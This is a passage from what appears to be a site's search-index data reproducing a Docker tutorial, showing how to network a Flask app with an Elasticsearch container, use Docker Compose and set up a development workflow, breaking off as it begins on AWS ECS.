ones. First off we tackle Node by installing the packages from npm and running the build command as defined in our <code>package.json</code> file. We finish the file off by installing the Python packages, exposing the port and defining the <code>CMD</code> to run as we did in the last section.</p> <p>Finally, we can go ahead, build the image and run the container (replace <code>yourusername</code> with your username below).</p> <pre><code>$ docker build -t yourusername/foodtrucks-web .\n</code></pre> <p>In the first run, this will take some time as the Docker client will download the ubuntu image, run all the commands and prepare your image. Re-running <code>docker build</code> after any subsequent changes you make to the application code will almost be instantaneous. Now let's try running our app.</p> <pre><code>$ docker run -P --rm yourusername/foodtrucks-web\nUnable to connect to ES. Retying in 5 secs...\nUnable to connect to ES. Retying in 5 secs...\nUnable to connect to ES. Retying in 5 secs...\nOut of retries. Bailing out...\n</code></pre> <p>Oops! Our flask app was unable to run since it was unable to connect to Elasticsearch. How do we tell one container about the other container and get them to talk to each other? The answer lies in the next section.</p>"},{"location":"CTF/Docker/#docker-network","title":"Docker Network","text":"<p>Before we talk about the features Docker provides especially to deal with such scenarios, let's see if we can figure out a way to get around the problem. Hopefully, this should give you an appreciation for the specific feature that we are going to study.</p> <p>Okay, so let's run <code>docker container ls</code> (which is same as <code>docker ps</code>) and see what we have.</p> <pre><code>$ docker container ls\nCONTAINER ID        IMAGE                                                 COMMAND                  CREATED             STATUS              PORTS                                            NAMES\n277451c15ec1        docker.elastic.co/elasticsearch/elasticsearch:6.3.2   \"/usr/local/bin/dock\u2026\"   17 minutes ago      Up 17 minutes       0.0.0.0:9200-&gt;9200/tcp, 0.0.0.0:9300-&gt;9300/tcp   es\n</code></pre> <p>So we have one ES container running on <code>0.0.0.0:9200</code> port which we can directly access. If we can tell our Flask app to connect to this URL, it should be able to connect and talk to ES, right? Let's dig into our Python code and see how the connection details are defined.</p> <pre><code>es = Elasticsearch(host='es')\n</code></pre> <p>To make this work, we need to tell the Flask container that the ES container is running on <code>0.0.0.0</code> host (the port by default is <code>9200</code>) and that should make it work, right? Unfortunately, that is not correct since the IP <code>0.0.0.0</code> is the IP to access ES container from the host machine i.e. from my Mac. Another container will not be able to access this on the same IP address. Okay if not that IP, then which IP address should the ES container be accessible by? I'm glad you asked this question.</p> <p>Now is a good time to start our exploration of networking in Docker. When docker is installed, it creates three networks automatically.</p> <pre><code>$ docker network ls\nNETWORK ID          NAME                DRIVER              SCOPE\nc2c695315b3a        bridge              bridge              local\na875bec5d6fd        host                host                local\nead0e804a67b        none                null                local\n</code></pre> <p>The bridge network is the network in which containers are run by default. So that means that when I ran the ES container, it was running in this bridge network. To validate this, let's inspect the network.</p> <pre><code>$ docker network inspect bridge\n[\n    {\n        \"Name\": \"bridge\",\n        \"Id\": \"c2c695315b3aaf8fc30530bb3c6b8f6692cedd5cc7579663f0550dfdd21c9a26\",\n        \"Created\": \"2018-07-28T20:32:39.405687265Z\",\n        \"Scope\": \"local\",\n        \"Driver\": \"bridge\",\n        \"EnableIPv6\": false,\n        \"IPAM\": {\n            \"Driver\": \"default\",\n            \"Options\": null,\n            \"Config\": [\n                {\n                    \"Subnet\": \"172.17.0.0/16\",\n                    \"Gateway\": \"172.17.0.1\"\n                }\n            ]\n        },\n        \"Internal\": false,\n        \"Attachable\": false,\n        \"Ingress\": false,\n        \"ConfigFrom\": {\n            \"Network\": \"\"\n        },\n        \"ConfigOnly\": false,\n        \"Containers\": {\n            \"277451c15ec183dd939e80298ea4bcf55050328a39b04124b387d668e3ed3943\": {\n                \"Name\": \"es\",\n                \"EndpointID\": \"5c417a2fc6b13d8ec97b76bbd54aaf3ee2d48f328c3f7279ee335174fbb4d6bb\",\n                \"MacAddress\": \"02:42:ac:11:00:02\",\n                \"IPv4Address\": \"172.17.0.2/16\",\n                \"IPv6Address\": \"\"\n            }\n        },\n        \"Options\": {\n            \"com.docker.network.bridge.default_bridge\": \"true\",\n            \"com.docker.network.bridge.enable_icc\": \"true\",\n            \"com.docker.network.bridge.enable_ip_masquerade\": \"true\",\n            \"com.docker.network.bridge.host_binding_ipv4\": \"0.0.0.0\",\n            \"com.docker.network.bridge.name\": \"docker0\",\n            \"com.docker.network.driver.mtu\": \"1500\"\n        },\n        \"Labels\": {}\n    }\n]\n</code></pre> <p>You can see that our container <code>277451c15ec1</code> is listed under the <code>Containers</code> section in the output. What we also see is the IP address this container has been allotted - <code>172.17.0.2</code>. Is this the IP address that we're looking for? Let's find out by running our flask container and trying to access this IP.</p> <pre><code>$ docker run -it --rm yourusername/foodtrucks-web bash\nroot@35180ccc206a:/opt/flask-app# curl 172.17.0.2:9200\n{\n  \"name\" : \"Jane Foster\",\n  \"cluster_name\" : \"elasticsearch\",\n  \"version\" : {\n    \"number\" : \"2.1.1\",\n    \"build_hash\" : \"40e2c53a6b6c2972b3d13846e450e66f4375bd71\",\n    \"build_timestamp\" : \"2015-12-15T13:05:55Z\",\n    \"build_snapshot\" : false,\n    \"lucene_version\" : \"5.3.1\"\n  },\n  \"tagline\" : \"You Know, for Search\"\n}\nroot@35180ccc206a:/opt/flask-app# exit\n</code></pre> <p>This should be fairly straightforward to you by now. We start the container in the interactive mode with the <code>bash</code> process. The <code>--rm</code> is a convenient flag for running one off commands since the container gets cleaned up when its work is done. We try a <code>curl</code> but we need to install it first. Once we do that, we see that we can indeed talk to ES on <code>172.17.0.2:9200</code>. Awesome!</p> <p>Although we have figured out a way to make the containers talk to each other, there are still two problems with this approach -</p> <ol> <li>How do we tell the Flask container that <code>es</code> hostname stands for <code>172.17.0.2</code> or some other IP since the IP can change?</li> <li>Since the bridge network is shared by every container by default, this method is not secure. How do we isolate our network?</li> </ol> <p>The good news that Docker has a great answer to our questions. It allows us to define our own networks while keeping them isolated using the <code>docker network</code> command.</p> <p>Let's first go ahead and create our own network.</p> <pre><code>$ docker network create foodtrucks-net\n0815b2a3bb7a6608e850d05553cc0bda98187c4528d94621438f31d97a6fea3c\n\n$ docker network ls\nNETWORK ID          NAME                DRIVER              SCOPE\nc2c695315b3a        bridge              bridge              local\n0815b2a3bb7a        foodtrucks-net      bridge              local\na875bec5d6fd        host                host                local\nead0e804a67b        none                null                local\n</code></pre> <p>The <code>network create</code> command creates a new bridge network, which is what we need at the moment. In terms of Docker, a bridge network uses a software bridge which allows containers connected to the same bridge network to communicate, while providing isolation from containers which are not connected to that bridge network. The Docker bridge driver automatically installs rules in the host machine so that containers on different bridge networks cannot communicate directly with each other. There are other kinds of networks that you can create, and you are encouraged to read about them in the official docs.</p> <p>Now that we have a network, we can launch our containers inside this network using the <code>--net</code> flag. Let's do that - but first, in order to launch a new container with the same name, we will stop and remove our ES container that is running in the bridge (default) network.</p> <pre><code>$ docker container stop es\nes\n\n$ docker container rm es\nes\n\n$ docker run -d --name es --net foodtrucks-net -p 9200:9200 -p 9300:9300 -e \"discovery.type=single-node\" docker.elastic.co/elasticsearch/elasticsearch:6.3.2\n13d6415f73c8d88bddb1f236f584b63dbaf2c3051f09863a3f1ba219edba3673\n\n$ docker network inspect foodtrucks-net\n[\n    {\n        \"Name\": \"foodtrucks-net\",\n        \"Id\": \"0815b2a3bb7a6608e850d05553cc0bda98187c4528d94621438f31d97a6fea3c\",\n        \"Created\": \"2018-07-30T00:01:29.1500984Z\",\n        \"Scope\": \"local\",\n        \"Driver\": \"bridge\",\n        \"EnableIPv6\": false,\n        \"IPAM\": {\n            \"Driver\": \"default\",\n            \"Options\": {},\n            \"Config\": [\n                {\n                    \"Subnet\": \"172.18.0.0/16\",\n                    \"Gateway\": \"172.18.0.1\"\n                }\n            ]\n        },\n        \"Internal\": false,\n        \"Attachable\": false,\n        \"Ingress\": false,\n        \"ConfigFrom\": {\n            \"Network\": \"\"\n        },\n        \"ConfigOnly\": false,\n        \"Containers\": {\n            \"13d6415f73c8d88bddb1f236f584b63dbaf2c3051f09863a3f1ba219edba3673\": {\n                \"Name\": \"es\",\n                \"EndpointID\": \"29ba2d33f9713e57eb6b38db41d656e4ee2c53e4a2f7cf636bdca0ec59cd3aa7\",\n                \"MacAddress\": \"02:42:ac:12:00:02\",\n                \"IPv4Address\": \"172.18.0.2/16\",\n                \"IPv6Address\": \"\"\n            }\n        },\n        \"Options\": {},\n        \"Labels\": {}\n    }\n]\n</code></pre> <p>As you can see, our <code>es</code> container is now running inside the <code>foodtrucks-net</code> bridge network. Now let's inspect what happens when we launch in our <code>foodtrucks-net</code> network.</p> <pre><code>$ docker run -it --rm --net foodtrucks-net yourusername/foodtrucks-web bash\nroot@9d2722cf282c:/opt/flask-app# curl es:9200\n{\n  \"name\" : \"wWALl9M\",\n  \"cluster_name\" : \"docker-cluster\",\n  \"cluster_uuid\" : \"BA36XuOiRPaghPNBLBHleQ\",\n  \"version\" : {\n    \"number\" : \"6.3.2\",\n    \"build_flavor\" : \"default\",\n    \"build_type\" : \"tar\",\n    \"build_hash\" : \"053779d\",\n    \"build_date\" : \"2018-07-20T05:20:23.451332Z\",\n    \"build_snapshot\" : false,\n    \"lucene_version\" : \"7.3.1\",\n    \"minimum_wire_compatibility_version\" : \"5.6.0\",\n    \"minimum_index_compatibility_version\" : \"5.0.0\"\n  },\n  \"tagline\" : \"You Know, for Search\"\n}\nroot@53af252b771a:/opt/flask-app# ls\napp.py  node_modules  package.json  requirements.txt  static  templates  webpack.config.js\nroot@53af252b771a:/opt/flask-app# python3 app.py\nIndex not found...\nLoading data in elasticsearch ...\nTotal trucks loaded:  733\n * Running on http://0.0.0.0:5000/ (Press CTRL+C to quit)\nroot@53af252b771a:/opt/flask-app# exit\n</code></pre> <p>Wohoo! That works! On user-defined networks like foodtrucks-net, containers can not only communicate by IP address, but can also resolve a container name to an IP address. This capability is called automatic service discovery. Great! Let's launch our Flask container for real now -</p> <pre><code>$ docker run -d --net foodtrucks-net -p 5000:5000 --name foodtrucks-web yourusername/foodtrucks-web\n852fc74de2954bb72471b858dce64d764181dca0cf7693fed201d76da33df794\n\n$ docker container ls\nCONTAINER ID        IMAGE                                                 COMMAND                  CREATED              STATUS              PORTS                                            NAMES\n852fc74de295        yourusername/foodtrucks-web                           \"python3 ./app.py\"       About a minute ago   Up About a minute   0.0.0.0:5000-&gt;5000/tcp                           foodtrucks-web\n13d6415f73c8        docker.elastic.co/elasticsearch/elasticsearch:6.3.2   \"/usr/local/bin/dock\u2026\"   17 minutes ago       Up 17 minutes       0.0.0.0:9200-&gt;9200/tcp, 0.0.0.0:9300-&gt;9300/tcp   es\n\n$ curl -I 0.0.0.0:5000\nHTTP/1.0 200 OK\nContent-Type: text/html; charset=utf-8\nContent-Length: 3697\nServer: Werkzeug/0.11.2 Python/2.7.6\nDate: Sun, 10 Jan 2016 23:58:53 GMT\n</code></pre> <p>Head over to http://0.0.0.0:5000 and see your glorious app live! Although that might have seemed like a lot of work, we actually just typed 4 commands to go from zero to running. I've collated the commands in a bash script.</p> <pre><code>#!/bin/bash\n\n# build the flask container\ndocker build -t yourusername/foodtrucks-web .\n\n# create the network\ndocker network create foodtrucks-net\n\n# start the ES container\ndocker run -d --name es --net foodtrucks-net -p 9200:9200 -p 9300:9300 -e \"discovery.type=single-node\" docker.elastic.co/elasticsearch/elasticsearch:6.3.2\n\n# start the flask app container\ndocker run -d --net foodtrucks-net -p 5000:5000 --name foodtrucks-web yourusername/foodtrucks-web\n</code></pre> <p>Now imagine you are distributing your app to a friend, or running on a server that has docker installed. You can get a whole app running with just one command!</p> <pre><code>$ git clone https://github.com/prakhar1989/FoodTrucks\n$ cd FoodTrucks\n$ ./setup-docker.sh\n</code></pre> <p>And that's it! If you ask me, I find this to be an extremely awesome, and a powerful way of sharing and running your applications!</p>"},{"location":"CTF/Docker/#docker-compose","title":"Docker Compose","text":"<p>Till now we've spent all our time exploring the Docker client. In the Docker ecosystem, however, there are a bunch of other open-source tools which play very nicely with Docker. A few of them are -</p> <ol> <li>Docker Machine - Create Docker hosts on your computer, on cloud providers, and inside your own data center</li> <li>Docker Compose - A tool for defining and running multi-container Docker applications.</li> <li>Docker Swarm - A native clustering solution for Docker</li> <li>Kubernetes - Kubernetes is an open-source system for automating deployment, scaling, and management of containerized applications.</li> </ol> <p>In this section, we are going to look at one of these tools, Docker Compose, and see how it can make dealing with multi-container apps easier.</p> <p>The background story of Docker Compose is quite interesting. Roughly around January 2014, a company called OrchardUp launched a tool called Fig. The idea behind Fig was to make isolated development environments work with Docker. The project was very well received on Hacker News - I oddly remember reading about it but didn't quite get the hang of it.</p> <p>The first comment on the forum actually does a good job of explaining what Fig is all about.</p> <p>So really at this point, that's what Docker is about: running processes. Now Docker offers a quite rich API to run the processes: shared volumes (directories) between containers (i.e. running images), forward port from the host to the container, display logs, and so on. But that's it: Docker as of now, remains at the process level.</p> <p>While it provides options to orchestrate multiple containers to create a single \"app\", it doesn't address the management of such group of containers as a single entity. And that's where tools such as Fig come in: talking about a group of containers as a single entity. Think \"run an app\" (i.e. \"run an orchestrated cluster of containers\") instead of \"run a container\".</p> <p>It turns out that a lot of people using docker agree with this sentiment. Slowly and steadily as Fig became popular, Docker Inc. took notice, acquired the company and re-branded Fig as Docker Compose.</p> <p>So what is Compose used for? Compose is a tool that is used for defining and running multi-container Docker apps in an easy way. It provides a configuration file called <code>docker-compose.yml</code> that can be used to bring up an application and the suite of services it depends on with just one command. Compose works in all environments: production, staging, development, testing, as well as CI workflows, although Compose is ideal for development and testing environments.</p> <p>Let's see if we can create a <code>docker-compose.yml</code> file for our SF-Foodtrucks app and evaluate whether Docker Compose lives up to its promise.</p> <p>The first step, however, is to install Docker Compose. If you're running Windows or Mac, Docker Compose is already installed as it comes in the Docker Toolbox. Linux users can easily get their hands on Docker Compose by following the instructions on the docs. Since Compose is written in Python, you can also simply do <code>pip install docker-compose</code>. Test your installation with -</p> <pre><code>$ docker-compose --version\ndocker-compose version 1.21.2, build a133471\n</code></pre> <p>Now that we have it installed, we can jump on the next step i.e. the Docker Compose file <code>docker-compose.yml</code>. The syntax for YAML is quite simple and the repo already contains the docker-compose file that we'll be using.</p> <pre><code>version: \"3\"\nservices:\n  es:\n    image: docker.elastic.co/elasticsearch/elasticsearch:6.3.2\n    container_name: es\n    environment:\n      - discovery.type=single-node\n    ports:\n      - 9200:9200\n    volumes:\n      - esdata1:/usr/share/elasticsearch/data\n  web:\n    image: yourusername/foodtrucks-web\n    command: python3 app.py\n    depends_on:\n      - es\n    ports:\n      - 5000:5000\n    volumes:\n      - ./flask-app:/opt/flask-app\nvolumes:\n  esdata1:\n    driver: local\n</code></pre> <p>Let me breakdown what the file above means. At the parent level, we define the names of our services - <code>es</code> and <code>web</code>. The <code>image</code> parameter is always required, and for each service that we want Docker to run, we can add additional parameters. For <code>es</code>, we just refer to the <code>elasticsearch</code> image available on Elastic registry. For our Flask app, we refer to the image that we built at the beginning of this section.</p> <p>Other parameters such as <code>command</code> and <code>ports</code> provide more information about the container. The <code>volumes</code> parameter specifies a mount point in our <code>web</code> container where the code will reside. This is purely optional and is useful if you need access to logs, etc. We'll later see how this can be useful during development. Refer to the online reference to learn more about the parameters this file supports. We also add volumes for the <code>es</code> container so that the data we load persists between restarts. We also specify <code>depends_on</code>, which tells docker to start the <code>es</code> container before <code>web</code>. You can read more about it on docker compose docs.</p> <p>Note: You must be inside the directory with the <code>docker-compose.yml</code> file in order to execute most Compose commands.</p> <p>Great! Now the file is ready, let's see <code>docker-compose</code> in action. But before we start, we need to make sure the ports and names are free. So if you have the Flask and ES containers running, lets turn them off.</p> <pre><code>$ docker stop es foodtrucks-web\nes\nfoodtrucks-web\n\n$ docker rm es foodtrucks-web\nes\nfoodtrucks-web\n</code></pre> <p>Now we can run <code>docker-compose</code>. Navigate to the food trucks directory and run <code>docker-compose up</code>.</p> <pre><code>$ docker-compose up\nCreating network \"foodtrucks_default\" with the default driver\nCreating foodtrucks_es_1\nCreating foodtrucks_web_1\nAttaching to foodtrucks_es_1, foodtrucks_web_1\nes_1  | [2016-01-11 03:43:50,300][INFO ][node                     ] [Comet] version[2.1.1], pid[1], build[40e2c53/2015-12-15T13:05:55Z]\nes_1  | [2016-01-11 03:43:50,307][INFO ][node                     ] [Comet] initializing ...\nes_1  | [2016-01-11 03:43:50,366][INFO ][plugins                  ] [Comet] loaded [], sites []\nes_1  | [2016-01-11 03:43:50,421][INFO ][env                      ] [Comet] using [1] data paths, mounts [[/usr/share/elasticsearch/data (/dev/sda1)]], net usable_space [16gb], net total_space [18.1gb], spins? [possibly], types [ext4]\nes_1  | [2016-01-11 03:43:52,626][INFO ][node                     ] [Comet] initialized\nes_1  | [2016-01-11 03:43:52,632][INFO ][node                     ] [Comet] starting ...\nes_1  | [2016-01-11 03:43:52,703][WARN ][common.network           ] [Comet] publish address: {0.0.0.0} is a wildcard address, falling back to first non-loopback: {172.17.0.2}\nes_1  | [2016-01-11 03:43:52,704][INFO ][transport                ] [Comet] publish_address {172.17.0.2:9300}, bound_addresses {[::]:9300}\nes_1  | [2016-01-11 03:43:52,721][INFO ][discovery                ] [Comet] elasticsearch/cEk4s7pdQ-evRc9MqS2wqw\nes_1  | [2016-01-11 03:43:55,785][INFO ][cluster.service          ] [Comet] new_master {Comet}{cEk4s7pdQ-evRc9MqS2wqw}{172.17.0.2}{172.17.0.2:9300}, reason: zen-disco-join(elected_as_master, [0] joins received)\nes_1  | [2016-01-11 03:43:55,818][WARN ][common.network           ] [Comet] publish address: {0.0.0.0} is a wildcard address, falling back to first non-loopback: {172.17.0.2}\nes_1  | [2016-01-11 03:43:55,819][INFO ][http                     ] [Comet] publish_address {172.17.0.2:9200}, bound_addresses {[::]:9200}\nes_1  | [2016-01-11 03:43:55,819][INFO ][node                     ] [Comet] started\nes_1  | [2016-01-11 03:43:55,826][INFO ][gateway                  ] [Comet] recovered [0] indices into cluster_state\nes_1  | [2016-01-11 03:44:01,825][INFO ][cluster.metadata         ] [Comet] [sfdata] creating index, cause [auto(index api)], templates [], shards [5]/[1], mappings [truck]\nes_1  | [2016-01-11 03:44:02,373][INFO ][cluster.metadata         ] [Comet] [sfdata] update_mapping [truck]\nes_1  | [2016-01-11 03:44:02,510][INFO ][cluster.metadata         ] [Comet] [sfdata] update_mapping [truck]\nes_1  | [2016-01-11 03:44:02,593][INFO ][cluster.metadata         ] [Comet] [sfdata] update_mapping [truck]\nes_1  | [2016-01-11 03:44:02,708][INFO ][cluster.metadata         ] [Comet] [sfdata] update_mapping [truck]\nes_1  | [2016-01-11 03:44:03,047][INFO ][cluster.metadata         ] [Comet] [sfdata] update_mapping [truck]\nweb_1 |  * Running on http://0.0.0.0:5000/ (Press CTRL+C to quit)\n</code></pre> <p>Head over to the IP to see your app live. That was amazing wasn't it? Just a few lines of configuration and we have two Docker containers running successfully in unison. Let's stop the services and re-run in detached mode.</p> <pre><code>web_1 |  * Running on http://0.0.0.0:5000/ (Press CTRL+C to quit)\nKilling foodtrucks_web_1 ... done\nKilling foodtrucks_es_1 ... done\n\n$ docker-compose up -d\nCreating es               ... done\nCreating foodtrucks_web_1 ... done\n\n$ docker-compose ps\n      Name                    Command               State                Ports\n--------------------------------------------------------------------------------------------\nes                 /usr/local/bin/docker-entr ...   Up      0.0.0.0:9200-&gt;9200/tcp, 9300/tcp\nfoodtrucks_web_1   python3 app.py                   Up      0.0.0.0:5000-&gt;5000/tcp\n</code></pre> <p>Unsurprisingly, we can see both containers running successfully. Where do the names come from? Those were created automatically by Compose. But does Compose also create the network automatically? Good question! Let's find out.</p> <p>First off, let us stop the services from running. We can always bring them back up with just one command. Data volumes will persist, so it\u2019s possible to start the cluster again with the same data using <code>docker-compose up</code>. To destroy the cluster and the data volumes, just type <code>docker-compose down -v</code>.</p> <pre><code>$ docker-compose down -v\nStopping foodtrucks_web_1 ... done\nStopping es               ... done\nRemoving foodtrucks_web_1 ... done\nRemoving es               ... done\nRemoving network foodtrucks_default\nRemoving volume foodtrucks_esdata1\n</code></pre> <p>While we're are at it, we'll also remove the <code>foodtrucks</code> network that we created last time.</p> <pre><code>$ docker network rm foodtrucks-net\n$ docker network ls\nNETWORK ID          NAME                 DRIVER              SCOPE\nc2c695315b3a        bridge               bridge              local\na875bec5d6fd        host                 host                local\nead0e804a67b        none                 null                local\n</code></pre> <p>Great! Now that we have a clean slate, let's re-run our services and see if Compose does its magic.</p> <pre><code>$ docker-compose up -d\nRecreating foodtrucks_es_1\nRecreating foodtrucks_web_1\n\n$ docker container ls\nCONTAINER ID        IMAGE                        COMMAND                  CREATED             STATUS              PORTS                    NAMES\nf50bb33a3242        yourusername/foodtrucks-web  \"python3 app.py\"         14 seconds ago      Up 13 seconds       0.0.0.0:5000-&gt;5000/tcp   foodtrucks_web_1\ne299ceeb4caa        elasticsearch                \"/docker-entrypoint.s\"   14 seconds ago      Up 14 seconds       9200/tcp, 9300/tcp       foodtrucks_es_1\n</code></pre> <p>So far, so good. Time to see if any networks were created.</p> <pre><code>$ docker network ls\nNETWORK ID          NAME                 DRIVER\nc2c695315b3a        bridge               bridge              local\nf3b80f381ed3        foodtrucks_default   bridge              local\na875bec5d6fd        host                 host                local\nead0e804a67b        none                 null                local\n</code></pre> <p>You can see that compose went ahead and created a new network called <code>foodtrucks_default</code> and attached both the new services in that network so that each of these are discoverable to the other. Each container for a service joins the default network and is both reachable by other containers on that network, and discoverable by them at a hostname identical to the container name.</p> <pre><code>$ docker ps\nCONTAINER ID        IMAGE                                                 COMMAND                  CREATED              STATUS              PORTS                              NAMES\n8c6bb7e818ec        docker.elastic.co/elasticsearch/elasticsearch:6.3.2   \"/usr/local/bin/dock\u2026\"   About a minute ago   Up About a minute   0.0.0.0:9200-&gt;9200/tcp, 9300/tcp   es\n7640cec7feb7        yourusername/foodtrucks-web                           \"python3 app.py\"         About a minute ago   Up About a minute   0.0.0.0:5000-&gt;5000/tcp             foodtrucks_web_1\n\n$ docker network inspect foodtrucks_default\n[\n    {\n        \"Name\": \"foodtrucks_default\",\n        \"Id\": \"f3b80f381ed3e03b3d5e605e42c4a576e32d38ba24399e963d7dad848b3b4fe7\",\n        \"Created\": \"2018-07-30T03:36:06.0384826Z\",\n        \"Scope\": \"local\",\n        \"Driver\": \"bridge\",\n        \"EnableIPv6\": false,\n        \"IPAM\": {\n            \"Driver\": \"default\",\n            \"Options\": null,\n            \"Config\": [\n                {\n                    \"Subnet\": \"172.19.0.0/16\",\n                    \"Gateway\": \"172.19.0.1\"\n                }\n            ]\n        },\n        \"Internal\": false,\n        \"Attachable\": true,\n        \"Ingress\": false,\n        \"ConfigFrom\": {\n            \"Network\": \"\"\n        },\n        \"ConfigOnly\": false,\n        \"Containers\": {\n            \"7640cec7feb7f5615eaac376271a93fb8bab2ce54c7257256bf16716e05c65a5\": {\n                \"Name\": \"foodtrucks_web_1\",\n                \"EndpointID\": \"b1aa3e735402abafea3edfbba605eb4617f81d94f1b5f8fcc566a874660a0266\",\n                \"MacAddress\": \"02:42:ac:13:00:02\",\n                \"IPv4Address\": \"172.19.0.2/16\",\n                \"IPv6Address\": \"\"\n            },\n            \"8c6bb7e818ec1f88c37f375c18f00beb030b31f4b10aee5a0952aad753314b57\": {\n                \"Name\": \"es\",\n                \"EndpointID\": \"649b3567d38e5e6f03fa6c004a4302508c14a5f2ac086ee6dcf13ddef936de7b\",\n                \"MacAddress\": \"02:42:ac:13:00:03\",\n                \"IPv4Address\": \"172.19.0.3/16\",\n                \"IPv6Address\": \"\"\n            }\n        },\n        \"Options\": {},\n        \"Labels\": {\n            \"com.docker.compose.network\": \"default\",\n            \"com.docker.compose.project\": \"foodtrucks\",\n            \"com.docker.compose.version\": \"1.21.2\"\n        }\n    }\n]\n</code></pre>"},{"location":"CTF/Docker/#development-workflow","title":"Development Workflow","text":"<p>Before we jump to the next section, there's one last thing I wanted to cover about docker-compose. As stated earlier, docker-compose is really great for development and testing. So let's see how we can configure compose to make our lives easier during development.</p> <p>Throughout this tutorial, we've worked with readymade docker images. While we've built images from scratch, we haven't touched any application code yet and mostly restricted ourselves to editing Dockerfiles and YAML configurations. One thing that you must be wondering is how does the workflow look during development? Is one supposed to keep creating Docker images for every change, then publish it and then run it to see if the changes work as expected? I'm sure that sounds super tedious. There has to be a better way. In this section, that's what we're going to explore.</p> <p>Let's see how we can make a change in the Foodtrucks app we just ran. Make sure you have the app running,</p> <pre><code>$ docker container ls\nCONTAINER ID        IMAGE                                                 COMMAND                  CREATED             STATUS              PORTS                              NAMES\n5450ebedd03c        yourusername/foodtrucks-web                           \"python3 app.py\"         9 seconds ago       Up 6 seconds        0.0.0.0:5000-&gt;5000/tcp             foodtrucks_web_1\n05d408b25dfe        docker.elastic.co/elasticsearch/elasticsearch:6.3.2   \"/usr/local/bin/dock\u2026\"   10 hours ago        Up 10 hours         0.0.0.0:9200-&gt;9200/tcp, 9300/tcp   es\n</code></pre> <p>Now let's see if we can change this app to display a <code>Hello world!</code> message when a request is made to <code>/hello</code> route. Currently, the app responds with a 404.</p> <pre><code>$ curl -I 0.0.0.0:5000/hello\nHTTP/1.0 404 NOT FOUND\nContent-Type: text/html\nContent-Length: 233\nServer: Werkzeug/0.11.2 Python/2.7.15rc1\nDate: Mon, 30 Jul 2018 15:34:38 GMT\n</code></pre> <p>Why does this happen? Since ours is a Flask app, we can see <code>app.py</code> (link) for answers. In Flask, routes are defined with @app.route syntax. In the file, you'll see that we only have three routes defined - <code>/</code>,<code>/debug</code>and<code>/search</code>. The<code>/</code>route renders the main app, the<code>debug</code>route is used to return some debug information and finally<code>search</code> is used by the app to query elasticsearch.</p> <pre><code>$ curl 0.0.0.0:5000/debug\n{\n  \"msg\": \"yellow open sfdata Ibkx7WYjSt-g8NZXOEtTMg 5 1 618 0 1.3mb 1.3mb\\n\",\n  \"status\": \"success\"\n}\n</code></pre> <p>Given that context, how would we add a new route for <code>hello</code>? You guessed it! Let's open <code>flask-app/app.py</code> in our favorite editor and make the following change</p> <pre><code>@app.route('/')\ndef index():\n  return render_template(\"index.html\")\n\n# add a new hello route\n@app.route('/hello')\ndef hello():\n  return \"hello world!\"\n</code></pre> <p>Now let's try making a request again</p> <pre><code>$ curl -I 0.0.0.0:5000/hello\nHTTP/1.0 404 NOT FOUND\nContent-Type: text/html\nContent-Length: 233\nServer: Werkzeug/0.11.2 Python/2.7.15rc1\nDate: Mon, 30 Jul 2018 15:34:38 GMT\n</code></pre> <p>Oh no! That didn't work! What did we do wrong? While we did make the change in <code>app.py</code>, the file resides in our machine (or the host machine), but since Docker is running our containers based off the <code>yourusername/foodtrucks-web</code> image, it doesn't know about this change. To validate this, lets try the following -</p> <pre><code>$ docker-compose run web bash\nStarting es ... done\nroot@581e351c82b0:/opt/flask-app# ls\napp.py        package-lock.json  requirements.txt  templates\nnode_modules  package.json       static            webpack.config.js\nroot@581e351c82b0:/opt/flask-app# grep hello app.py\nroot@581e351c82b0:/opt/flask-app# exit\n</code></pre> <p>What we're trying to do here is to validate that our changes are not in the <code>app.py</code> that's running in the container. We do this by running the command <code>docker-compose run</code>, which is similar to its cousin <code>docker run</code> but takes additional arguments for the service (which is <code>web</code> in our case). As soon as we run <code>bash</code>, the shell opens in <code>/opt/flask-app</code> as specified in our Dockerfile. From the grep command we can see that our changes are not in the file.</p> <p>Lets see how we can fix it. First off, we need to tell docker compose to not use the image and instead use the files locally. We'll also set debug mode to <code>true</code> so that Flask knows to reload the server when <code>app.py</code> changes. Replace the <code>web</code> portion of the <code>docker-compose.yml</code> file like so:</p> <pre><code>version: \"3\"\nservices:\n  es:\n    image: docker.elastic.co/elasticsearch/elasticsearch:6.3.2\n    container_name: es\n    environment:\n      - discovery.type=single-node\n    ports:\n      - 9200:9200\n    volumes:\n      - esdata1:/usr/share/elasticsearch/data\n  web:\n    build: . # replaced image with build\n    command: python3 app.py\n    environment:\n      - DEBUG=True # set an env var for flask\n    depends_on:\n      - es\n    ports:\n      - \"5000:5000\"\n    volumes:\n      - ./flask-app:/opt/flask-app\nvolumes:\n  esdata1:\n    driver: local\n</code></pre> <p>With that change (diff), let's stop and start the containers.</p> <pre><code>$ docker-compose down -v\nStopping foodtrucks_web_1 ... done\nStopping es               ... done\nRemoving foodtrucks_web_1 ... done\nRemoving es               ... done\nRemoving network foodtrucks_default\nRemoving volume foodtrucks_esdata1\n\n$ docker-compose up -d\nCreating network \"foodtrucks_default\" with the default driver\nCreating volume \"foodtrucks_esdata1\" with local driver\nCreating es ... done\nCreating foodtrucks_web_1 ... done\n</code></pre> <p>As a final step, lets make the change in <code>app.py</code> by adding a new route. Now we try to curl</p> <pre><code>$ curl 0.0.0.0:5000/hello\nhello world\n</code></pre> <p>Wohoo! We get a valid response! Try playing around by making more changes in the app.</p> <p>That concludes our tour of Docker Compose. With Docker Compose, you can also pause your services, run a one-off command on a container and even scale the number of containers. I also recommend you checkout a few other use-cases of Docker compose. Hopefully, I was able to show you how easy it is to manage multi-container environments with Compose. In the final section, we are going to deploy our app to AWS!</p>"},{"location":"CTF/Docker/#aws-elastic-container-service","title":"AWS Elastic Container Service","text":"<p>In the last section we used <code>docker-compose</code> to run our app locally with a single command: <code>docker-compose up</code>. Now that we have a functioning app we want to share this with the world, get some users, make tons of money and buy a big house in Miami. Executing the last three are beyond the scope of the tutorial, so we'll spend our time instead on figuring out how we can deploy our multi-container apps on the cloud with AWS.</p> <p>If you've read this far you are pretty much convinced that Docker is a pretty cool technology. And you are not alone. Seeing the meteoric rise of Docker, almost all Cloud vendors started working on adding support for deploying Docker apps on their platform. As of today, you can deploy containers on Google Cloud Platform, AWS, Azure and many others. We already got a primer on deploying single container apps with Elastic Beanstalk and in this section we are going to look at Elastic Container Service (or ECS) by AWS.</p> <p>AWS ECS is a scalable and super flexible container management service that supports Docker containers. It allows you to operate a Docker cluster on top of EC2 instances via an easy-to-use API. Where Beanstalk came with reasonable defaults, ECS allows you to completely tune your environment as per your needs. This makes ECS, in my opinion, quite complex to get started with.</p> <p>Luckily for us, ECS has a friendly 